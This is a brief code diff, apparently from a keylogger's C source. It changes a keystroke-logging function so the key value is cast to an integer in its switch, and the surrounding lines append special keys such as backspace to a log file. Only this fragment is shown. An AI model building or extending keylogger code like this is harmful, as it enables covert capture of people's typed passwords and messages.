@@ -35,7 +35,7 @@ void log(char key) {
     if (key == 1 || key == 2) return;
 
     FILE *fp = fopen(LOG, "a+");
-    switch (key)
+    switch ((int)key)
     {
     case 0x08:
         fprintf(fp, "%s", "[BACKSPACE]");
